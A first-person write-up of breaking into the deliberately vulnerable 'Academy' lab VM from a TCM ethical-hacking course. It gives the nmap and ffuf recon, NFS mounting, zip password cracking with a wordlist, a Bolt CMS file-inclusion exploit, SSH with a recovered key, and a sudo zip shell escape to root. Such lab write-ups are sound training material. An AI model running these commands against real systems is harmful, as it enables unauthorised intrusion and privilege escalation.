This is my first write up

This Vulnerable by design VM is provided by TCM Academy as part of the Practical Ethical Hacking - The Complete Course

I had to change Network cards to NAT, also for some reason this VM was dual honed, however, this is not relevant.

When the VM booted, I had to log in and run DHclient (creds are provided in a text file by TCM)

DHClient
I then ran Netdiscover to get target IP, (for me).

sudo netdiscover -r 192.168.22.0/24
I find my target VM

192.168.22.136

Next step is to run NMAP

sudo nmap -A -p- -T4 192.168.22.136
image image

Interesting ports and info

22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open http Apache httpd 2.4.38 ((Debian))
_http-server-header: Apache/2.4.38 (Debian)
_http-title: Bolt - Installation error
111/tcp open rpcbind 2-4 (RPC #100000)
2049/tcp open nfs_acl 3 (RPC #100227)
8080/tcp open http Apache httpd 2.4.38 ((Debian))
_http-server-header: Apache/2.4.38 (Debian)
_Methods supported:CONNECTION
_http-title: PHP 7.3.27-1~deb10u1 - phpinfo()
Running Linux 4.X 5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel!
Browse to port http://192.168.22.136:80

Default webpage bolt installation error?

image

I browsed to http://192.168.22.136:8080 Discovered PHP settings

image

Then I ran FFUF to parse web folders in two tabs

ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.22.136/FUZZ
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.22.136:8080/FUZZ
So, then I checked NFS

Showmount -e 192.168.22.136 for nfs
mkdir in mnt i called it nfs

cd mnt
mkdir nfs
sudo mount -t nfs 192.168.22.136:/srv/nfs /mnt/nfs -o nolock
In nfs folder I found a file called save.zip

image

However the file is password protected. so I tried fcrack!

Fcrack -v -u -D -p /usr/share/wordlists/rockyou.txt
info -v=verbose -u=unzip -D=dictionary -p=file

password is java101

I extract 2 files

image

Ok so then I cat both files

image

the id_rsa is a certificate file

I discovered the following web folders

image

Opened config.yaml and we Find a username & password

image

I went back to port 80 tp see what bolt is...

After Googling, it seems to be a CMS, I also find an exploit for a local file inclusion

https://www.exploit-db.com/exploits/48411

image

Run the exploit after registering an account

image

image

The one of interest to me is the user 1000 permission futher down the list

jeanpaul‚ùå1000:1000:jeanpaul,,,:/home/jeanpaul:/bin/bash

image

Ok so then I tried logging in as jeanpaul with a password (this didnt work, so used SSH -i id_rsa - I also had to change permission on file to 400

ssh -i id_rsa jeanpaul@192.168.22.136
sudo -l
(root) NOPASSWD: /usr/bin/zip

So the above means I can run zip as root

So goto GTFOBINS

https://gtfobins.github.io/

search for ZIP, and get the sudo one

I typed commands one line at a time

TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF
image

BOOM JOB DONE! Thanks to TCM Academy for the VM

